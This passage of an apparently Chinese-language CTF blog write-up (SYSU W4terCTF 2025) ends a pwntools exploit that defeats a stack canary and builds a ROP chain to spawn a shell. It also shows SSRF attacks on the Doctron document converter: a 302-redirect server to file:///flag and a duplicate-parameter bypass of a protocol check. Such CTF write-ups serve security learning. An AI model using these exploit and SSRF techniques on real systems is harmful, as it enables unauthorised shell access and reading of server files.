system(&quot;/bin/sh&quot;)</span></span><br><span class="line"></span><br><span class="line">Â  Â  log.info(<span class="string">f&quot;å‘é€ ROP payload (é•¿åº¦: <span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span>)...&quot;</span>)</span><br><span class="line">Â  Â  r.sendline(payload)</span><br><span class="line"></span><br><span class="line">Â  Â  log.info(<span class="string">&quot;ROP payload å·²å‘é€ï¼Œå°è¯•è¿›å…¥äº¤äº’æ¨¡å¼...&quot;</span>)</span><br><span class="line">Â  Â  r.interactive()</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="comment"># ä¸»ç¨‹åºå…¥å£</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">Â  Â  context.update(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">Â  Â  context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">try</span>:</span><br><span class="line">Â  Â  Â  Â  conn = remote(HOST, PORT)</span><br><span class="line">Â  Â  Â  Â  log.info(<span class="string">f&quot;æˆåŠŸè¿æ¥åˆ° <span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">Â  Â  Â  Â  log.error(<span class="string">f&quot;è¿æ¥åˆ° <span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span> å¤±è´¥: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  exit()</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># è§£å†³æ‰«é›·æ¸¸æˆ</span></span><br><span class="line">Â  Â  solve_minesweeper(conn)</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># Phaze 1: è·å–Canary</span></span><br><span class="line">Â  Â  get_canary(conn)</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment">#Phaze 2: å°è¯•è·å– libc å‡½æ•°åœ°å€</span></span><br><span class="line">Â  Â  get_libc_base(conn)</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment">#Phaze 3: æ„é€ æœ€ç»ˆ ROP æ”»å‡»é“¾ï¼</span></span><br><span class="line">Â  Â  rop_attack(conn)</span><br><span class="line"></span><br><span class="line">Â  Â  conn.close()</span><br></pre></td></tr></table></figure>
<h1 id="doc-tron"><a class="markdownIt-Anchor" href="#doc-tron"></a> Doc. Tron</h1>
<p>Doctron æä¾›äº†å¤šä¸ªæ¥æ”¶ URL å‚æ•°è¿›è¡Œæ–‡æ¡£è½¬æ¢çš„æ¥å£ï¼Œå…¶ä¸­å­˜åœ¨ <strong>SSRF</strong> æ¼æ´çš„å¯èƒ½æ€§ã€‚</p>
<p>åˆæ­¥å°è¯•ç›´æ¥ä½¿ç”¨ <code>file:///flag</code> ä½œä¸º <code>url</code> å‚æ•°è®¿é—® <code>/convert/html2pdf</code> æˆ– <code>/convert/html2image</code> æ¥å£ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://&lt;host&gt;:&lt;port&gt;/convert/html2pdf?u=doctron&amp;p=lampnick&amp;url=file:///flag&quot;</span></span><br></pre></td></tr></table></figure>
<p>ç»“æœæ”¶åˆ°äº† <code>&#123;&quot;code&quot;:10000004,&quot;message&quot;:&quot;only support http/https&quot;,&quot;data&quot;:null&#125;</code> çš„é”™è¯¯ã€‚é€šè¿‡åˆ†æ <code>params.go</code> ä»£ç ï¼Œå‘ç° <code>CheckParams</code> middleware æ˜ç¡®æ ¡éªŒäº† <code>url</code> å‚æ•°çš„åè®®ï¼Œåªå…è®¸ http æˆ– httpsã€‚</p>
<p>æ—¢ç„¶ç›´æ¥ä½¿ç”¨ <code>file:///</code> è¢«åè®®æ ¡éªŒé˜»æ­¢ï¼Œé‚£ä¹ˆç”¨ç»å…¸çš„ SSRF ç»•è¿‡æŠ€å·§ï¼Œé€šè¿‡ HTTP 302 è·³è½¬ã€‚åœ¨æœ¬åœ°æ­å»ºä¸€ä¸ªç®€å•çš„ HTTP æœåŠ¡å™¨ï¼Œé…ç½®å…¶å¯¹ä»»æ„è¯·æ±‚éƒ½ 302 è·³è½¬åˆ° <code>file:///flag</code>ã€‚ç„¶åè®© Doctron é€šè¿‡ SSRF è®¿é—®è¿™ä¸ªæœ¬åœ°æœåŠ¡å™¨çš„ URLã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RedirectHandler</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Received request from <span class="subst">&#123;self.client_address[<span class="number">0</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Responding with 302 redirect to file:///flag&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.send_response(<span class="number">302</span>)</span><br><span class="line">        <span class="variable language_">self</span>.send_header(<span class="string">&#x27;Location&#x27;</span>, <span class="string">&#x27;file:///flag&#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.end_headers()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">log_message</span>(<span class="params">self, <span class="built_in">format</span>, *args</span>):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    port = <span class="number">8000</span></span><br><span class="line">    server_address = (<span class="string">&#x27;0.0.0.0&#x27;</span>, port)</span><br><span class="line">    httpd = HTTPServer(server_address, RedirectHandler)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[*] Starting redirect server on port <span class="subst">&#123;port&#125;</span>...&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        httpd.serve_forever()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n[*] Stopping server.&quot;</span>)</span><br><span class="line">        httpd.server_close()</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>å°è¯•è°ƒç”¨ <code>/convert/html2pdf</code> æˆ– <code>/convert/html2image</code>ï¼Œ<code>url</code> å‚æ•°æŒ‡å‘æœ¬åœ°è·³è½¬æœåŠ¡å™¨ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v <span class="string">&quot;http://&lt;host&gt;:&lt;port&gt;/convert/html2pdf?u=doctron&amp;p=lampnick&amp;url=http://172.17.0.1:8000/&quot;</span></span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡è¯·æ±‚æˆåŠŸç»•è¿‡äº† <code>CheckParams</code> çš„åè®®æ ¡éªŒï¼ŒDoctron é€šè¿‡ <code>chromedp</code> æˆ– <code>pkg/curl</code> è®¿é—®äº†è·³è½¬ URLï¼Œå¹¶æˆåŠŸè¯»å–äº† <code>/flag</code> æ–‡ä»¶å†…å®¹ã€‚ç„¶è€Œï¼Œå°† <code>/flag</code> çš„çº¯æ–‡æœ¬å†…å®¹è½¬æ¢ä¸º PDF æˆ–å›¾ç‰‡æ—¶ï¼Œè¾“å‡ºæ–‡ä»¶ï¼ˆPDF æˆ– PNGï¼‰æ˜¯ç©ºç™½çš„æˆ–æŸåçš„ã€‚å°è¯• <code>/convert/pdfAddWatermark</code> å¹¶å°† <code>/flag</code> ä½œä¸ºå›¾ç‰‡æˆ– PDF æºåŠ è½½æ—¶ï¼Œå¯¼è‡´ worker ä»»åŠ¡è¶…æ—¶ (30 ç§’)ã€‚è¿™äº›ç»“æœè¡¨æ˜ Doctron çš„è½¬æ¢/è§£æåº“æ— æ³•æ­£ç¡®å¤„ç†çº¯æ–‡æœ¬è¾“å…¥ï¼Œå¹¶ä¸”é”™è¯¯ä¿¡æ¯è¢«å±è”½ã€‚<br>
<img src="/2025/04/28/SYSU%20W4terCTF%202025/doctron_faild.png" alt="doctron_faild.png"></p>
<p>æœ€åæ ¹æ®å…³é”®Hintï¼šâ€œé—®é¢˜ä¸åœ¨äºç”Ÿæˆ pdf æˆ–æµè§ˆå™¨æ¸²æŸ“ï¼›golang ä¸­å¯ä»¥ç»•è¿‡ CheckParams å‡½æ•°å»ä½¿ç”¨ file åè®®è¯»æ–‡ä»¶â€ã€‚è¿™ä¸ªæç¤ºçº æ­£äº†ä¹‹å‰å¯¹æ¸²æŸ“é—®é¢˜çš„å…³æ³¨ï¼Œå¹¶æ˜ç¡®æŒ‡å‡ºå¯ä»¥ç»•è¿‡ <code>CheckParams</code> ç›´æ¥ä½¿ç”¨ <code>file://</code>ã€‚</p>
<p>é€šè¿‡é‡æ–°åˆ†æ <code>params.go</code>ï¼Œ<code>CheckParams</code> è·å–åä¸º <code>&quot;url&quot;</code> çš„å‚æ•°ï¼Œç„¶åæ ¡éªŒå…¶åè®®ã€‚æç¤ºâ€œç»•è¿‡ CheckParams å‡½æ•°â€å¼ºçƒˆæš—ç¤ºï¼Œå­˜åœ¨ä¸€ç§æ–¹æ³•æä¾›ä¸€ä¸ª URLï¼Œå®ƒèƒ½è¢« Doctron åç»­ä»£ç è¯†åˆ«ä¸ºæº URLï¼Œä½†å´ç»•è¿‡äº† <code>CheckParams</code> å¯¹ <code>&quot;url&quot;</code> å‚æ•°çš„æ ¡éªŒã€‚æœ€å¯èƒ½çš„ç»•è¿‡æ–¹æ³•æ˜¯<strong>é‡å¤å‚æ•°</strong>ã€‚å‡è®¾ <code>CheckParams</code> ä¸­çš„ <code>ctx.URLParam(&quot;url&quot;)</code> è·å–çš„æ˜¯ç¬¬ä¸€ä¸ªåŒåå‚æ•°çš„å€¼ï¼Œè€Œ Doctron åç»­çš„å‚æ•°ç»‘å®šæœºåˆ¶è·å–çš„æ˜¯æœ€åä¸€ä¸ªã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v <span class="string">&quot;http://&lt;host&gt;:&lt;port&gt;/convert/html2image?u=doctron&amp;p=lampnick&amp;url=http://example.com&amp;url=file:///flag&quot;</span></span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡å°è¯•è¿”å›äº† <code>HTTP/1.1 200 OK</code>ï¼Œ<code>Content-Type: image/png</code>ï¼Œå¹¶å¼€å§‹è¿›è¡Œåˆ†å—ç¼–ç ä¼ è¾“ï¼Œä½†æœ€ç»ˆä¼ è¾“å¤±è´¥ã€‚è¿™è¯æ˜<strong>é‡å¤å‚æ•°æˆåŠŸç»•è¿‡äº† <code>CheckParams</code> çš„åè®®æ ¡éªŒ</strong>ï¼ŒDoctron æˆåŠŸè¯»å–äº† <code>/flag</code> æ–‡ä»¶å†…å®¹ï¼Œå¹¶å°è¯•è¿›è¡Œå›¾ç‰‡è½¬æ¢ï¼</p>
<p>ç ´æŸä¸è¦ç´§ï¼Œæˆ‘ä»¬å…ˆä¿å­˜ä¸‹æ¥çœ‹çœ‹ï¼Ÿ<br>
<img src="/2025/04/28/SYSU%20W4terCTF%202025/doctron_succeed.png" alt="doctron_succeed.png"></p>
<h1 id="w4terctf-2025-æ€»ç»“"><a class="markdownIt-Anchor" href="#w4terctf-2025-æ€»ç»“"></a> W4terCTF 2025 æ€»ç»“</h1>
<p>28å·å¼€å§‹çš„æ¯”èµ›ï¼Œå†æ—¶ä¸€å‘¨ï¼Œç»ˆäºåœ¨äº”ä¸€å‡æœŸçš„æœ«å°¾ç»“æŸäº†ï¼ä¸€å¼€å§‹åªæƒ³ç€åšå‡ é“ç­¾åˆ°é¢˜æ„Ÿå—ä¸€ä¸‹ä»€ä¹ˆæ˜¯ CTF ï¼Œæ²¡æƒ³åˆ°é˜Ÿå‹å‘æŒ¥å¼ºåŠ²ï¼Œæˆ‘ä¹Ÿåœ¨å¼ºçƒˆçš„â€œæ­£åé¦ˆâ€ä¸‹ï¼Œç›´æ¥æŠŠæ‰€æœ‰æ—¶é—´éƒ½æŠ•å…¥äº†è¿›å»ã€‚éå¸¸éå¸¸é«˜å…´æˆ‘ä»¬ Team Nooob èƒ½åœ¨æ ¡èµ›ä¸Šæ‹¿ä¸‹å‰åï¼ï¼ï¼ï¼ï¼ï¼ï¼<br>
<img src="/2025/04/28/SYSU%20W4terCTF%202025/ranking.png" alt="ranking.png"><br>
<img src="/2025/04/28/SYSU%20W4terCTF%202025/curve.png" alt="curve.png"></p>
<p>ä½œä¸ºåè¶³çš„æ–°æ‰‹ï¼Œåœ¨è¿™æ¬¡çš„æ ¡èµ›ä¸­æ”¶è·é¢‡ä¸°ã€‚å°è±¡æœ€æ·±çš„æ˜¯ WMC25 çš„ä¸‰é“é¢˜ç›®ï¼Œä»æœ€å¼€å§‹çš„æ ˆæº¢å‡ºï¼Œåˆ°æƒ³åŠæ³•è·å¾— Canary å€¼å¹¶ç»•è¿‡ï¼Œè¦†ç›–è¿”å›åœ°å€ä¸ºåé—¨å‡½æ•°ï¼Œå†åˆ°å¼€å¯ PIE éšæœºåŠ è½½åœ°å€ï¼Œå°è¯•è·å¾— Libc åŸºå€å®ç° ret2libcï¼Œå†æœ€åæ„é€ ç²¾å·§çš„ ROP è°ƒç”¨é“¾ï¼Œå®ç°è°ƒç”¨ä¸€ä¸ªâ€œä»æœªå‡ºç°è¿‡â€çš„å‡½æ•°ï¼è¿™ä¸€åˆ‡å›æƒ³èµ·æ¥è¿˜æ˜¯ä»¤äººæ¿€åŠ¨ä¸å·²ï¼Œè™½ç„¶è¿™äº›éƒ½æ˜¯ CTF æœ€åŸºç¡€çš„å†…å®¹ï¼Œä½†æ˜¯äº²æ‰‹å®è·µå¹¶ä¸€æ­¥æ­¥æ”»å…‹éš¾ç‚¹çš„è¿‡ç¨‹å¯¹äºæ–°æ‰‹çš„æˆ‘æ¥è¯´æ˜¯å®è´µçš„ç»éªŒã€‚</p>
<p>ä¸ç•æµ®äº‘é®æœ›çœ¼ï¼Œåœ¨å¤§ä½¬äº‘é›†çš„æ ¡èµ›æ‹¿ä¸‹å¦‚æ­¤æˆç»©å®åœ¨å¾—æ„Ÿè°¢é˜Ÿå‹ä»¬çš„ä»˜å‡ºã€‚é‚£ä¹ˆï¼Œæ˜å¹´å†ä¼šï¼Œé‚£æ—¶å€™çš„æˆ‘ä¼šæ›´åŠ å¼ºå¤§ï¼</p>
</article><div class="tag_share"><div class="post_share"><div class="social-share" data-image="../../../../img/avatar.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="../../../05/06/Lab%20-%20xv6%20and%20Unix%20utilities/" title="6.s081 Lab: Xv6 and Unix utilities"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">ä¸Šä¸€ç¯‡</div><div class="prev_info">6.s081 Lab: Xv6 and Unix utilities</div></div></a></div><div class="next-post pull-right"><a href="../../20/Operating-System-Concepts-Ch6/" title="Operating System Concepts: Synchronization"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">ä¸‹ä¸€ç¯‡</div><div class="next_info">Operating System Concepts: Synchronization</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="../../../../img/avatar.jpg" onerror="this.onerror=null;this.src='../../../../img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">è˜‹æœ«é£</div><div class="author-info__description">éšç¼˜æ›´å„ç§æ‚ä¸ƒæ‚å…«çš„ä¸œè¥¿</div></div><div class="card-info-data site-data is-center"><a href="../../../../archives/"><div class="headline">æ–‡ç« </div><div class="length-num">23</div></a><a href="../../../../tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">0</div></a><a href="../../../../categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">0</div></a></div><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Akane0238" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="../../../../mailto:qweasd28848@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>ç›®å½•</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0%E9%97%AE%E5%8D%B7"><span class="toc-number">1.</span> <span class="toc-text"> ç­¾åˆ°é—®å·</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%A1%E7%90%86%E5%91%98%E7%9A%84%E5%AF%86%E7%A0%81"><span class="toc-number">2.</span> <span class="toc-text"> ç®¡ç†å‘˜çš„å¯†ç </span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#wmc25-d0"><span class="toc-number">3.</span> <span class="toc-text"> WMC25 D0</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#wmc25-d1"><span class="toc-number">4.</span> <span class="toc-text"> WMC25 D1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#wmc25-d2"><span class="toc-number">5.</span> <span class="toc-text"> WMC25 D2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#-code9-"><span class="toc-number">5.1.</span> <span class="toc-text"> 123456$ checksec --file&#x3D;.&#x2F;pwnRELRO            FULL RELROSTACK CANARY     Canary foundNX               NX enabledPIE              PIE enabledRPATH            No RPATH</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#putsplt-%E6%89%93%E5%8D%B0-libc-%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80"><span class="toc-number">5.1.1.</span> <span class="toc-text"> &lt;puts@plt&gt; æ‰“å° libc å‡½æ•°åœ°å€</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%A0%88%E5%AD%98%E7%95%99%E7%9A%84-libc-%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E4%BF%A1%E6%81%AF"><span class="toc-number">5.1.2.</span> <span class="toc-text"> è¯»å–æ ˆå­˜ç•™çš„ libc å‡½æ•°è°ƒç”¨ä¿¡æ¯</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#doc-tron"><span class="toc-number">6.</span> <span class="toc-text"> Doc. Tron</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#w4terctf-2025-%E6%80%BB%E7%BB%93"><span class="toc-number">7.</span> <span class="toc-text"> W4terCTF 2025 æ€»ç»“</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>æœ€æ–°æ–‡ç« </span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="" title="Operating System Concepts: Memory Management">Operating System Concepts: Memory Management</a><time datetime="2025-05-19T13:32:29.399Z" title="å‘è¡¨äº 2025-05-19 21:32:29">2025-05-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="../../15/Lab-System%20Calls/" title="6.s081 Lab: System Calls">6.s081 Lab: System Calls</a><time datetime="2025-05-15T12:36:40.671Z" title="å‘è¡¨äº 2025-05-15 20:36:40">2025-05-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="../../06/Lab%20-%20xv6%20and%20Unix%20utilities/" title="6.s081 Lab: Xv6 and Unix utilities">6.s081 Lab: Xv6 and Unix utilities</a><time datetime="2025-05-06T09:13:39.861Z" title="å‘è¡¨äº 2025-05-06 17:13:39">2025-05-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="../../../04/28/SYSU%20W4terCTF%202025/" title="SYSU W4terCTF 2025">SYSU W4terCTF 2025</a><time datetime="2025-04-28T04:48:37.447Z" title="å‘è¡¨äº 2025-04-28 12:48:37">2025-04-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="../../../04/20/Operating-System-Concepts-Ch6/" title="Operating System Concepts: Synchronization">Operating System Concepts: Synchronization</a><time datetime="2025-04-20T06:12:39.233Z" title="å‘è¡¨äº 2025-04-20 14:12:39">2025-04-20</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="framework-info"><span>æ¡†æ¶ </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>ä¸»é¢˜ </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="æµ…è‰²å’Œæ·±è‰²æ¨¡å¼è½¬æ¢"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="../../../../js/utils.js?v=4.13.0"></script><script src="../../../../js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/copy-tex.min.js"></script><script>(() => {
  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
    btf.wrap(item, 'div', { class: 'katex-wrap'})
  })
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>